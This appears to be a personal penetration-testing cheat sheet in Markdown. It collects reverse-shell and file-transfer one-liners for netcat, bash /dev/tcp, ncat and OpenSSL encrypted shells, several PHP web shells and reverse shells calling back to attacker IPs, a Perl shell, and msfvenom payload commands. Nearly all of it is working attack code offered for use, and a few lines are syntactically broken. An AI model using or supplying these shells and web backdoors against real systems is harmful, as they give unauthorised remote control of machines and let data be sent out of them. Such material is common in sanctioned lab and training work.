# Always check FW from both side

## Shellerator roxx for a quick reverse shell 

---

## Send a file

```nc -nlvp 5555 > incoming.txt```
```nc -nv <ip> 5555 < filetosend.txt```

---

## Reverse shell nc traditional :

```nc -nlvp 5555```
```nc -nv <ip> 5555 -e /bin/bash```

- I had issues sometimes from windows to a linux, try ```nc -lvp``` instead of ```nc -nlvp```

---

## Bash reverse shell :

```bash -i > /dev/tcp/IP/PORT 2>&1 0>&1```

---

## Encrypted shell :

```
ncat --exec /bin/bash --allow <ip> -vnl 5555 --ssl
ncat -v <ip> 5555 --ssl
```

---

## With OpenSSL :

- Generate keys on the attacker box : ```openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes```

- Then start the listener : ```openssl s_server -quiet -key key.pem -cert cert.pem -port 5555```

- Victime : ```mkfifo /tmp/t; /bin/sh -i < /tmp/t 2>&1 | openssl s_client -quiet -connect <ATTACKER-IP>:5555 > /tmp/t; rm /tmp/t```


---

## IIS

- Use .asp file or .aspx


--- 

## PHP 

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.156 LPORT=5555 -o drive.php

<?php $sock=fsockopen("10.11.0.156",5555);exec("/bin/sh -i <&3 >&3 2>&3");?>

<?php echo shell_exec($_GET['cmd']);?>

<?php system('cmd');?>

<?php echo shell_exec('bash -i > /dev/tcp/10.11.0.156/5555 2>&1 0>&1');?>


<?php ("bash -i > /dev/tcp/10.11.0.156/5555 0>&1 2>&1"):?>

<?php echo shell_exec("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'");?>

<?php exec("telnet 10.11.0.156 5555 | /bin/sh | telnet 10.11.0.156 5555");?>

<?php exec("exec /bin/sh 0</dev/tcp/10.11.0.156/5555 1>&0 2>&0");?>

<?php exec("php -r $s=fsockopen(10.11.0.156,5555);exec(/bin/sh -i <&3 >&3 2>&3);");?>
```	


--- 

## perl shell :

```
use Socket;$i="192.168.0.213";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
```

---

## Javascript :

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f js_le -e generic/none
```
If you are attacking a Linux host:
```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 CMD=/bin/bash -f js_le -e generic/none
```



